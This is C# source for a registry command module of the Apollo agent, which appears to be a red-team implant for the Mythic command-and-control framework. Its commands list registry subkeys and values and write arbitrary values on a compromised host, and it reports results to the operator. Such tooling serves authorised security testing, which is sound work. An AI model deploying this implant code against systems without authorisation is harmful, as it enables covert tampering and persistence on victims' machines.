#define COMMAND_NAME_UPPER

#if DEBUG
#undef REG_QUERY_SUBKEYS
#undef REG_QUERY_VALUES
#undef REG_READ_VALUE
#undef REG_WRITE_VALUE
#define REG_QUERY_SUBKEYS
#define REG_QUERY_VALUES
#define REG_READ_VALUE
#define REG_WRITE_VALUE
#endif


#if REG_QUERY_SUBKEYS || REG_QUERY_VALUENAMES || REG_READ_VALUE || REG_WRITE_VALUE
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Mythic.Structs;
using Apollo.Jobs;
using Apollo.MessageInbox;
using Apollo.Tasks;
using Utils;
using static Utils.StringUtils;
using System.Security.Policy;
using System.CodeDom;
using System.Windows.Forms;
using System.Linq;
using System.Collections.Generic;

namespace Apollo.CommandModules
{
#if REG_QUERY_SUBKEYS
    public struct RegQuerySubKeysArguments
    {
        public string key;
    }
    public struct RegQuerySubKeysResult
    {
        public string key;
        public string full_key;
    }
#endif
#if REG_QUERY_VALUES
    public struct RegQueryValuesArguments
    {
        public string key;
    }

    public struct RegQueryValuesResult
    {
        public string name;
        public string type;
        public object value;
    }
#endif
#if REG_WRITE_VALUE
    public struct RegWriteValueArguments
    {
        public string key;
        public string value_name;
        public string value_value;
    }
#endif
    public class RegistryManager
    {
        public static void Execute(Job job, Agent implant)
        {
            bool isJsonArgs = job.Task.parameters[0] == '{';
            string[] commands = null;
            string key = "";
            string value_name = "";
            string value_value = "";
            
            if (string.IsNullOrEmpty(job.Task.parameters))
            {
                job.SetError("No arguments given.");
                return;
            }
            if (!isJsonArgs)
                commands = SplitCommandLine(job.Task.parameters);

            switch (job.Task.command)
            {
#if REG_QUERY_SUBKEYS
                case "reg_query_subkeys":
                    try
                    {
                        if (isJsonArgs)
                        {
                            RegQuerySubKeysArguments args = JsonConvert.DeserializeObject<RegQuerySubKeysArguments>(job.Task.parameters);
                            key = args.key;
                        }
                        else
                        {
                            if (commands.Length == 0)
                            {
                                job.SetError("No arguments given.");
                                return;
                            }
                            key = commands[0];
                        }
                        if (string.IsNullOrEmpty(key))
                        {
                            job.SetError("No key given.");
                            return;
                        }
                        string[] subkeys = RegistryUtils.GetSubKeys(key);

                        List<RegQuerySubKeysResult> results = new List<RegQuerySubKeysResult>();
                        foreach(string subkey in subkeys)
                        {
                            string full_key = key.EndsWith("\\") ? key + subkey : string.Format("{0}\\{1}", key, subkey);
                            results.Add(new RegQuerySubKeysResult()
                            {
                                key = subkey,
                                full_key = full_key
                            });
                        }
                        job.SetComplete(results.ToArray());
                    } catch (Exception ex)
                    {
                        job.SetError(string.Format("Exception occurred while listing subkeys of {0}: {1}", key, ex.Message));
                    }
                    break;
#endif
#if REG_QUERY_VALUES
                case "reg_query_values":
                    try
                    {
                        if (isJsonArgs)
                        {
                            RegQueryValuesArguments args = JsonConvert.DeserializeObject<RegQueryValuesArguments>(job.Task.parameters);
                            key = args.key;
                        } else if (commands.Length > 0)
                        {
                            key = commands[0];
                        }
                        if (string.IsNullOrEmpty(key))
                        {
                            job.SetError("No key given to list values names for.");
                            return;
                        }
                        string[] valuenames = RegistryUtils.GetValueNames(key);
                        if (valuenames == null || valuenames.Length == 0)
                            valuenames = new string[] { "" };
                        if (!valuenames.Contains(""))
                        {
                            string[] tempArray = new string[valuenames.Length + 1];
                            Array.Copy(valuenames, tempArray, valuenames.Length);
                            tempArray[tempArray.Length - 1] = "";
                            valuenames = tempArray;
                        }
                        List<RegQueryValuesResult> results = new List<RegQueryValuesResult>();
                        foreach(string valname in valuenames)
                        {
                            string tempvalname = valname;
                            if (string.IsNullOrEmpty(valname))
                                tempvalname = "(Default)";
                            object value = null;
                            string result = "";
                            string type = "";
                            try
                            {
                                value = RegistryUtils.GetValue(key, valname);
                            }
                            catch (Exception ex)
                            {
                                result = ex.Message;
                                type = "error";
                            }
                            if (string.IsNullOrEmpty(result))
                            {
                                if (value is String)
                                {
                                    result = string.IsNullOrEmpty(value.ToString()) ? "(value not set)" : value.ToString();
                                    type = "string";
                                }
                                else if (value is int)
                                {
                                    result = value.ToString();
                                    type = "int";
                                }
                                else if (value is byte[])
                                {
                                    result = BitConverter.ToString((byte[])value);
                                    type = "byte[]";
                                }
                                else if (value is null)
                                {
                                    result = "(value not set)";
                                    type = "null";
                                }
                                else
                                {
                                    result = value.ToString();
                                    type = "unknown";
                                }
                            }
                            results.Add(new RegQueryValuesResult()
                            {
                                name = tempvalname,
                                value = result,
                                type = type
                            });
                        }
                        job.SetComplete(results.ToArray());
                    } catch (Exception ex)
                    {
                        job.SetError(string.Format("Error occurred while listing values for {0}: {1}", key, ex.Message));
                    }
                    break;
#endif
#if REG_WRITE_VALUE
                case "reg_write_value":
                    try
                    {
                        if (isJsonArgs)
                        {
                            RegWriteValueArguments args = JsonConvert.DeserializeObject<RegWriteValueArguments>(job.Task.parameters);
                            key = args.key;
                            value_name = args.value_name;
                            value_value = args.value_value;
                        } else if (commands.Length == 3)
                        {
                            key = commands[0];
                            value_name = commands[1];
                            value_value = commands[2];
                        } else
                        {
                            job.SetError(string.Format("Invalid number of command line arguments given. Expected 3, got:\n\t{0}", string.Join(", ", commands)));
                            return;
                        }
                        bool bRet;
                        if (int.TryParse(value_value, out int dword))
                            bRet = RegistryUtils.SetValue(key, value_name, dword);
                        else
                            bRet = RegistryUtils.SetValue(key, value_name, value_value);
                        value_name = string.IsNullOrEmpty(value_name) ? "(Default)" : value_name;
                        if (bRet)
                        {
                            job.Task.completed = true;
                            ApolloTaskResponse resp = new ApolloTaskResponse(job.Task, $"Successfully set {value_name} to {value_value}")
                            {
                                artifacts = new Artifact[] { new Artifact() { artifact = $"Set {value_name} to {value_value} under {key}"} }
                            };
                            job.SetComplete(resp);
                        }
                        else
                            job.SetError(string.Format("Error setting {0} to {1}", value_name, value_value));
                    } catch (Exception ex)
                    {
                        value_name = string.IsNullOrEmpty(value_name) ? "(Default)" : value_name;
                        job.SetError(string.Format("Error setting {0} to {1}: {2}", value_name, value_value, ex.Message));
                    }
                    break;
#endif
                default:
                    job.SetError("Unknown command: " + job.Task.command);
                    break;
            }
        }
    }
}
#endif